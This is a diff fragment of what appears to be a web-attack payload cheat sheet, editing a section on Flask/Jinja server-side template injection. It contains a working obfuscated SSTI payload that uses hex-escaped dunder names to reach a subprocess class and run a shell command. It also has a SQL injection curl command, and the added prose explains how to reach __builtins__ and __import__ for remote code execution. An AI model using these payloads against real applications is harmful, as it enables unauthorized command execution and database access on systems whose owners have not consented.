@@ -3475,7 +3475,7 @@ curl [url]/ -d "input=' or 1=1--+ "
 
 ------------------
 
-- Payload
+- The payload below allows gain RCE in SSTI with multiple classes available, if you can call `__init__` with a class,you should be able to call `__builtins__` directly or call `__builtins__` with `__globals__`.The function `__builtins__` will be used to access `__import__` to trigger `RCE`.
 
 ```flask
 ()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5f\x67etitem\x5f\x5f')(356)('ls',shell=True,stdout=-1)|attr('communicate')()
@@ -3494,6 +3494,7 @@ curl [url]/ -d "input=' or 1=1--+ "
 ```
 
 
+- Proof of Concept-:
 
 
 
